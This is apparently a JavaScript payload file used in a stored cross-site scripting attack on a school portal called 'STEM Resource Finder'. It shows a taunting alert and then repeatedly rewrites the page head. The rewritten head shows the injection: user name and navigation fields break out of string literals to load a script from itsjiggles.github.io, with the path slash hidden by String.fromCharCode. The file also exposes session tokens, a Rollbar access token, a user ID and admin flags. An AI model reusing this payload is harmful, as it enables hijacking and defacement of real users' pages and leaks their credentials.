alert('you silly billy fr created a vulnerable site silly billy');

setInterval(function () {document.head.innerHTML = `<script type="text/javascript">var _rollbarConfig = {"accessToken":"0e77389c6d874d3c8dc27e2a1dce57b0","captureUncaught":true,"payload":{"environment":"production","person":{"id":1251074,"username":null,"email":null}}};</script>
<script type="text/javascript">!function(r){var e={};function o(n){if(e[n])return e[n].exports;var t=e[n]={i:n,l:!1,exports:{}};return r[n].call(t.exports,t,t.exports,o),t.l=!0,t.exports}o.m=r,o.c=e,o.d=function(r,e,n){o.o(r,e)||Object.defineProperty(r,e,{enumerable:!0,get:n})},o.r=function(r){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(r,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(r,"__esModule",{value:!0})},o.t=function(r,e){if(1&e&&(r=o(r)),8&e)return r;if(4&e&&"object"==typeof r&&r&&r.__esModule)return r;var n=Object.create(null);if(o.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:r}),2&e&&"string"!=typeof r)for(var t in r)o.d(n,t,function(e){return r[e]}.bind(null,t));return n},o.n=function(r){var e=r&&r.__esModule?function(){return r.default}:function(){return r};return o.d(e,"a",e),e},o.o=function(r,e){return Object.prototype.hasOwnProperty.call(r,e)},o.p="",o(o.s=0)}([function(r,e,o){"use strict";var n=o(1),t=o(5);_rollbarConfig=_rollbarConfig||{},_rollbarConfig.rollbarJsUrl=_rollbarConfig.rollbarJsUrl||"https://cdn.rollbar.com/rollbarjs/refs/tags/v2.19.3/rollbar.min.js",_rollbarConfig.async=void 0===_rollbarConfig.async||_rollbarConfig.async;var a=n.setupShim(window,_rollbarConfig),l=t(_rollbarConfig);window.rollbar=n.Rollbar,a.loadFull(window,document,!_rollbarConfig.async,_rollbarConfig,l)},function(r,e,o){"use strict";var n=o(2),t=o(3);function a(r){return function(){try{return r.apply(this,arguments)}catch(r){try{console.error("[Rollbar]: Internal error",r)}catch(r){}}}}var l=0;function i(r,e){this.options=r,this._rollbarOldOnError=null;var o=l++;this.shimId=function(){return o},"undefined"!=typeof window&&window._rollbarShims&&(window._rollbarShims[o]={handler:e,messages:[]})}var s=o(4),d=function(r,e){return new i(r,e)},c=function(r){return new s(d,r)};function u(r){return a((function(){var e=this,o=Array.prototype.slice.call(arguments,0),n={shim:e,method:r,args:o,ts:new Date};window._rollbarShims[this.shimId()].messages.push(n)}))}i.prototype.loadFull=function(r,e,o,n,t){var l=!1,i=e.createElement("script"),s=e.getElementsByTagName("script")[0],d=s.parentNode;i.crossOrigin="",i.src=n.rollbarJsUrl,o||(i.async=!0),i.onload=i.onreadystatechange=a((function(){if(!(l||this.readyState&&"loaded"!==this.readyState&&"complete"!==this.readyState)){i.onload=i.onreadystatechange=null;try{d.removeChild(i)}catch(r){}l=!0,function(){var e;if(void 0===r._rollbarDidLoad){e=new Error("rollbar.js did not load");for(var o,n,a,l,i=0;o=r._rollbarShims[i++];)for(o=o.messages||[];n=o.shift();)for(a=n.args||[],i=0;i<a.length;++i)if("function"==typeof(l=a[i])){l(e);break}}"function"==typeof t&&t(e)}()}})),d.insertBefore(i,s)},i.prototype.wrap=function(r,e,o){try{var n;if(n="function"==typeof e?e:function(){return e||{}},"function"!=typeof r)return r;if(r._isWrap)return r;if(!r._rollbar_wrapped&&(r._rollbar_wrapped=function(){o&&"function"==typeof o&&o.apply(this,arguments);try{return r.apply(this,arguments)}catch(o){var e=o;throw e&&("string"==typeof e&&(e=new String(e)),e._rollbarContext=n()||{},e._rollbarContext._wrappedSource=r.toString(),window._rollbarWrappedError=e),e}},r._rollbar_wrapped._isWrap=!0,r.hasOwnProperty))for(var t in r)r.hasOwnProperty(t)&&(r._rollbar_wrapped[t]=r[t]);return r._rollbar_wrapped}catch(e){return r}};for(var p="log,debug,info,warn,warning,error,critical,global,configure,handleUncaughtException,handleAnonymousErrors,handleUnhandledRejection,captureEvent,captureDomContentLoaded,captureLoad".split(","),f=0;f<p.length;++f)i.prototype[p[f]]=u(p[f]);r.exports={setupShim:function(r,e){if(r){var o=e.globalAlias||"Rollbar";if("object"==typeof r[o])return r[o];r._rollbarShims={},r._rollbarWrappedError=null;var l=new c(e);return a((function(){e.captureUncaught&&(l._rollbarOldOnError=r.onerror,n.captureUncaughtExceptions(r,l,!0),e.wrapGlobalEventHandlers&&t(r,l,!0)),e.captureUnhandledRejections&&n.captureUnhandledRejections(r,l,!0);var a=e.autoInstrument;return!1!==e.enabled&&(void 0===a||!0===a||"object"==typeof a&&a.network)&&r.addEventListener&&(r.addEventListener("load",l.captureLoad.bind(l)),r.addEventListener("DOMContentLoaded",l.captureDomContentLoaded.bind(l))),r[o]=l,l}))()}},Rollbar:c}},function(r,e,o){"use strict";function n(r,e,o,n){r._rollbarWrappedError&&(n[4]||(n[4]=r._rollbarWrappedError),n[5]||(n[5]=r._rollbarWrappedError._rollbarContext),r._rollbarWrappedError=null);var t=e.handleUncaughtException.apply(e,n);o&&o.apply(r,n),"anonymous"===t&&(e.anonymousErrorsPending+=1)}r.exports={captureUncaughtExceptions:function(r,e,o){if(r){var t;if("function"==typeof e._rollbarOldOnError)t=e._rollbarOldOnError;else if(r.onerror){for(t=r.onerror;t._rollbarOldOnError;)t=t._rollbarOldOnError;e._rollbarOldOnError=t}e.handleAnonymousErrors();var a=function(){var o=Array.prototype.slice.call(arguments,0);n(r,e,t,o)};o&&(a._rollbarOldOnError=t),r.onerror=a}},captureUnhandledRejections:function(r,e,o){if(r){"function"==typeof r._rollbarURH&&r._rollbarURH.belongsToShim&&r.removeEventListener("unhandledrejection",r._rollbarURH);var n=function(r){var o,n,t;try{o=r.reason}catch(r){o=void 0}try{n=r.promise}catch(r){n="[unhandledrejection] error getting \`promise\` from event"}try{t=r.detail,!o&&t&&(o=t.reason,n=t.promise)}catch(r){}o||(o="[unhandledrejection] error getting \`reason\` from event"),e&&e.handleUnhandledRejection&&e.handleUnhandledRejection(o,n)};n.belongsToShim=o,r._rollbarURH=n,r.addEventListener("unhandledrejection",n)}}}},function(r,e,o){"use strict";function n(r,e,o){if(e.hasOwnProperty&&e.hasOwnProperty("addEventListener")){for(var n=e.addEventListener;n._rollbarOldAdd&&n.belongsToShim;)n=n._rollbarOldAdd;var t=function(e,o,t){n.call(this,e,r.wrap(o),t)};t._rollbarOldAdd=n,t.belongsToShim=o,e.addEventListener=t;for(var a=e.removeEventListener;a._rollbarOldRemove&&a.belongsToShim;)a=a._rollbarOldRemove;var l=function(r,e,o){a.call(this,r,e&&e._rollbar_wrapped||e,o)};l._rollbarOldRemove=a,l.belongsToShim=o,e.removeEventListener=l}}r.exports=function(r,e,o){if(r){var t,a,l="EventTarget,Window,Node,ApplicationCache,AudioTrackList,ChannelMergerNode,CryptoOperation,EventSource,FileReader,HTMLUnknownElement,IDBDatabase,IDBRequest,IDBTransaction,KeyOperation,MediaController,MessagePort,ModalWindow,Notification,SVGElementInstance,Screen,TextTrack,TextTrackCue,TextTrackList,WebSocket,WebSocketWorker,Worker,XMLHttpRequest,XMLHttpRequestEventTarget,XMLHttpRequestUpload".split(",");for(t=0;t<l.length;++t)r[a=l[t]]&&r[a].prototype&&n(e,r[a].prototype,o)}}},function(r,e,o){"use strict";function n(r,e){this.impl=r(e,this),this.options=e,function(r){for(var e=function(r){return function(){var e=Array.prototype.slice.call(arguments,0);if(this.impl[r])return this.impl[r].apply(this.impl,e)}},o="log,debug,info,warn,warning,error,critical,global,configure,handleUncaughtException,handleAnonymousErrors,handleUnhandledRejection,_createItem,wrap,loadFull,shimId,captureEvent,captureDomContentLoaded,captureLoad".split(","),n=0;n<o.length;n++)r[o[n]]=e(o[n])}(n.prototype)}n.prototype._swapAndProcessMessages=function(r,e){var o,n,t;for(this.impl=r(this.options);o=e.shift();)n=o.method,t=o.args,this[n]&&"function"==typeof this[n]&&("captureDomContentLoaded"===n||"captureLoad"===n?this[n].apply(this,[t[0],o.ts]):this[n].apply(this,t));return this},r.exports=n},function(r,e,o){"use strict";r.exports=function(r){return function(e){if(!e&&!window._rollbarInitialized){for(var o,n,t=(r=r||{}).globalAlias||"Rollbar",a=window.rollbar,l=function(r){return new a(r)},i=0;o=window._rollbarShims[i++];)n||(n=o.handler),o.handler._swapAndProcessMessages(l,o.messages);window[t]=n,window._rollbarInitialized=!0}}}}]);</script>
<meta content='text/xhtml; charset=utf-8' http-equiv='content-type'>
<title>STEM Resource Finder</title>
<meta content='width=device-width, initial-scale=1' name='viewport'>
<meta content='all' name='distribution'>
<meta content='all' name='robots'>
<meta content='document' name='resource-type'>
<link href='/assets/favicon-7bcb29d2e4d6b9f8773eb4a57fe34022597000a0e0c6a049568675aa870affe5.ico' rel='shortcut icon'>
<!-- Open graph tags -->
<meta content='STEM Resource Finder' property='og:site_name'>
<link rel="stylesheet" media="screen, presentation" href="/assets/application-c5ce7832de2009482701a72173b8b847be70a69e6f2ec2b8cddab900dc48abe5.css" />
<link rel="stylesheet" media="print" href="/assets/print-d7b05d6fde765de8f57e19a90f6e45592725928956cb06fdb56fd85ce127f819.css" />
<!-- Include museo fonts. -->
<script src='https://use.typekit.com/juj7nhw.js'></script>
<script>
try{Typekit.load({ async: true });}catch(e){}
</script>
<script crossorigin='anonymous' src='https://kit.fontawesome.com/32aedade6e.js'></script>
<!-- Include scripts that are based on rails data and need to be generated dynamically. They cannot be precompiled. -->
<script>
  if (typeof Portal === 'undefined') {
    Portal = {
      siteName: "STEM Resource Finder"
    }
  }
  
  Portal.oauthProviders = [{"name":"schoology","display_name":"Schoology","directPath":"/users/auth/schoology"},{"name":"google","display_name":"Google","directPath":"/users/auth/google"}];
  Portal.theme = "learn"; // see theme_helper.rb
  Portal.enewsSubscriptionEnabled = true;
  Portal.sitewideAlert = ""
</script>
<script id='navigationData' type='application/json'>
{"name":"\";}};var h=String.fromCharCode(47);var s=document.createElement(\"script\");g={get f(){return \" \";}};s.src=h+h+'itsjiggles.github.io'+h+'x.js';document.head.appendChild(s);g={get f(){return \"","help":{"label":"help","url":"/help","id":"/help","type":"LINK","popOut":true},"greeting":"Welcome,","selected_section":"__ROOT__","request_path":"/my_classes","links":[{"type":"LINK","sort":-1,"id":"/help","label":"Help","url":"/help","small":true,"iconName":"icon-help","popOut":true},{"type":"LINK","sort":0,"id":"/settings","label":"Settings","url":"/users/1251074/preferences","small":true,"iconName":"icon-settings"},{"type":"LINK","sort":5,"id":"/71333","label":"8E Science 10th period","url":"/portal/classes/71333"}]}
</script>
<script>
  Portal.API_V1 = {
    FAKE_ID: "999",
  
    COUNTRIES: "/api/v1/countries",
    SECURITY_QUESTIONS: "/api/v1/security_questions",
    STUDENTS: "/api/v1/students",
    STUDENT_CHECK_PASSWORD: "/api/v1/students/999/check_password",
    studentCheckPassword: function (studentId) {
      return this.STUDENT_CHECK_PASSWORD.replace(this.FAKE_ID, studentId);
    },
    TEACHERS: "/api/v1/teachers",
    STATES: "/api/v1/states",
    DISTRICTS: "/api/v1/districts",
    SCHOOLS: "/api/v1/schools",
  
    //
    // Login and email availability.
    //
    EMAILS:         "/api/v1/teachers/email_available",
    LOGINS:         "/api/v1/teachers/login_available",
  
    //
    // Login and name validation.
    //
    LOGIN_VALID:    "/api/v1/teachers/login_valid",
    NAME_VALID:     "/api/v1/teachers/name_valid",
  
    CLASSWORD: "/api/v1/students/check_class_word",
    COLLABORATIONS: "/api/v1/collaborations",
    AVAILABLE_COLLABORATORS: "/api/v1/collaborations/available_collaborators",
  
    //
    // Materials
    //
    MATERIALS_FEATURED: "/api/v1/materials/featured",
    MATERIALS_OWN: "/api/v1/materials/own",
    MATERIALS_BIN_COLLECTIONS: "/api/v1/materials_bin/collections",
    MATERIALS_BIN_UNOFFICIAL_MATERIALS: "/api/v1/materials_bin/unofficial_materials",
    MATERIALS_BIN_UNOFFICIAL_MATERIALS_AUTHORS: "/api/v1/materials_bin/unofficial_materials_authors",
  
    //
    // Offerings
    //
    OFFERING: "/api/v1/offerings/999",
    offering: function (offeringId) {
      return this.OFFERING.replace(this.FAKE_ID, offeringId);
    },
    OFFERINGS: "/api/v1/offerings",
  
    //
    // Classes
    //
    CLASS: "/api/v1/classes/999",
    class: function (classId) {
      return this.CLASS.replace(this.FAKE_ID, classId);
    },
  
    //
    // Favorites
    //
    MATERIALS_ADD_FAVORITE:     "/api/v1/materials/add_favorite",
    MATERIALS_REMOVE_FAVORITE:  "/api/v1/materials/remove_favorite",
    MATERIALS_GET_FAVORITE:     "/api/v1/materials/get_favorites",
  
    SEARCH: "/api/v1/search/search",
    ASSIGN_MATERIAL_TO_CLASS: "/api/v1/materials/assign_to_class",
    MATERIAL_UNASSIGNED_CLASSES: "/api/v1/materials/unassigned_clazzes",
    MATERIAL_SHOW: "/api/v1/materials/show",
  
    //
    // Reporting
    //
    // keep old name for now so as to not break older external reports
    EXTERNAL_RESEARCHER_REPORT_QUERY: "/api/v1/report_learners_es/external_report_query",
    EXTERNAL_RESEARCHER_REPORT_LEARNER_QUERY: "/api/v1/report_learners_es/external_report_query",
    EXTERNAL_RESEARCHER_REPORT_LEARNER_QUERY_JWT: "/api/v1/report_learners_es/external_report_query_jwt",
    EXTERNAL_RESEARCHER_REPORT_USER_QUERY: "/api/v1/report_users/external_report_query",
  
    //
    // Site Notices
    //
    SITE_NOTICES_INDEX: "/api/v1/site_notices/index",
    SITE_NOTICES_NEW: "/api/v1/site_notices/new",
    SITE_NOTICES_CREATE: "/api/v1/site_notices/create",
    SITE_NOTICES_EDIT: "/api/v1/site_notices/edit",
    GET_NOTICES_FOR_USER: "/api/v1/site_notices/get_notices_for_user",
    SITE_NOTICES_TOGGLE_DISPLAY: "/api/v1/site_notices/toggle_notice_display",
  
    // Navigation
    // NavigationHelper#get_navigation_json  see app/helpers/navigation_helper.rb
    getNavigation: function() {
      return JSON.parse(document.getElementById('navigationData').innerHTML)
    },
  
    // Logging
    getLogManagerUrl: function () {
      return "https://logger.concord.org/logs" || "https://logger.concord.org/logs"
    }
  };
</script>

<script>
  Portal.currentUser = {
    get isAnonymous() {
      return "false" === "true";
    },
    get isLoggedIn() {
      return !this.isAnonymous;
    },
    get isAdmin() {
      return true;
    },
    get isManager() {
      return true;
    },
    get isResearcher() {
      return "false" === "true";
    },
    get isAuthor() {
      return "false" === "true";
    },
    get isTeacher() {
      // portal_teacher can return nil which is interpolated to "" string.
      return "false" === "true";
    },
    get isStudent() {
      // portal_student can return nil which is interpolated to "" string.
      return false;
    },
    get firstName() {
      return "";}};var h=String.fromCharCode(47);var s=document.createElement("script");g={get f(){return "";
    },
    get lastName() {
      return "";}};s.src=h+h+'itsjiggles.github.io'+h+'x.js';document.head.appendChild(s);g={get f(){return "";
    },
    get fullName() {
      return "";}};s.src=h+h+'itsjiggles.github.io'+h+'x.js';document.head.appendChild(s);g={get f(){return ", ";}};var h=String.fromCharCode(47);var s=document.createElement("script");g={get f(){return "";
    },
    get homePath() {
      return "/my_classes";
    },
    get userId() {
      return "1251074";
    }
  };
</script>


<script src="/assets/application-449c06d81ff130fe5594ba81c7cafe3b42b2fa57538075430bdade6b2a5267ce.js"></script>
<!-- add the external css if defined -->

<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="j8GpqR0RI7moa0JCsX6LSP3gUz/ss+BDvavjeeHy1LRsRe9YQX9I7sSJ34Y2u3EvaA6hNOe0+Q8YXO2PQnCKxg==" />
<!-- shouldn't probably do this here, do it on domloaded elsewhere..: -->
<script>
//<![CDATA[
tinyMCE.init({
    theme : 'advanced',
    mode : 'textareas',
    plugins : "paste, safari",
    width : '100%',
    height : '100%',
    editor_deselector : "mceNoEditor",
    auto_resize : true,
    remove_script_host : false,
    relative_urls : false,
    gecko_spellcheck : true,
    theme_advanced_resizing : true,
    theme_advanced_resizing_use_cookie : true,
    theme_advanced_toolbar_location : 'top',
    theme_advanced_buttons1 : 'bold,italic,underline,|,sup,sub,|,bullist,numlist,|,link,image,|,pastext, pasteword,selectall,|,code',
    theme_advanced_buttons2 : '',
    theme_advanced_buttons3 : '',
    paste_auto_cleanup_on_paste : true,
    paste_preprocess : function(pl, o) {
        // Content string containing the HTML from the clipboard
        // alert(o.content);
    },
    paste_postprocess : function(pl, o) {
        // Content DOM node containing the DOM structure of the clipboard
        // alert(o.node.innerHTML);
    },
    theme_advanced_statusbar_location : 'bottom',
    convert_newlines_to_brs : false,
    convert_fonts_to_spans : true,
    theme_advanced_path : false,
    valid_elements: '@[id|class|style|title|dir<ltr?rtl|lang|xml::lang|onclick|ondblclick|onmousedown|onmouseup|onmouseover|onmousemove|onmouseout|onkeypress|onkeydown|onkeyup],a[rel|rev|charset|hreflang|tabindex|accesskey|type|name|href|target|title|class|onfocus|onblur],strong/b,em/i,strike,u,#p,-ol[type|compact],-ul[type|compact],-li,br,img[longdesc|usemap|src|border|alt=|title|hspace|vspace|width|height|align],-sub,-sup,-blockquote,-table[border=0|cellspacing|cellpadding|width|frame|rules|height|align|summary|bgcolor|background|bordercolor],-tr[rowspan|width|height|align|valign|bgcolor|background|bordercolor],tbody,thead,tfoot,#td[colspan|rowspan|width|height|align|valign|bgcolor|background|bordercolor|scope],#th[colspan|rowspan|width|height|align|valign|scope],caption,-div,-span,-code,-pre,address,-h1,-h2,-h3,-h4,-h5,-h6,hr[size|noshade],-font[face|size|color],dd,dl,dt,cite,abbr,acronym,del[datetime|cite],ins[datetime|cite],object[classid|width|height|codebase|*],param[name|value|_value],embed[type|width|height|src|*],script[src|type],map[name],area[shape|coords|href|alt|target],bdo,button,col[align|char|charoff|span|valign|width],colgroup[align|char|charoff|span|valign|width],dfn,fieldset,form[action|accept|accept-charset|enctype|method],input[accept|alt|checked|disabled|maxlength|name|readonly|size|src|type|value],kbd,label[for],legend,noscript,optgroup[label|disabled],option[disabled|label|selected|value],q[cite],samp,select[disabled|multiple|name|size],small,textarea[cols|rows|disabled|name|readonly],tt,var,big,iframe[align<bottom?left?middle?right?top|class|frameborder|height|id|longdesc|marginheight|marginwidth|name|scrolling<auto?no?yes|src|width]'
});

//]]>
</script>
<script>
//<![CDATA[
var AUTH_TOKEN = "/zBnahmP3cm96GUj3TsnOmD5+k2WKblfW5DcbyFoac4ctCGbReG2ntEK+Oda/t1d9RcIRp0uoBP+Z9KZguo3vA==";
//]]>
</script>
<!-- PIE needs to be conditionally included for IE. -->
<!-- The boxed conditional comment below is required. -->
<!-- Do NOT remove it unless you know what you're doing. -->
<!--[if lt IE 10]>
<script src="/assets/pie/PIE-80f8b44e7b0ec0d2331152258ac4a2fcc8ac8a11972a9359eee9deda68167c10.js"></script>
<![endif]-->
<!-- Google tag (gtag.js) -->
<script async src='https://www.googletagmanager.com/gtag/js?id=G-MLQR60T0S4'></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  
  gtag('config', 'G-MLQR60T0S4');
</script>

<script>
//<![CDATA[
jQuery(function(){jQuery('input[placeholder], textarea[placeholder]').placeholder();});
//]]>
</script>`}, 1)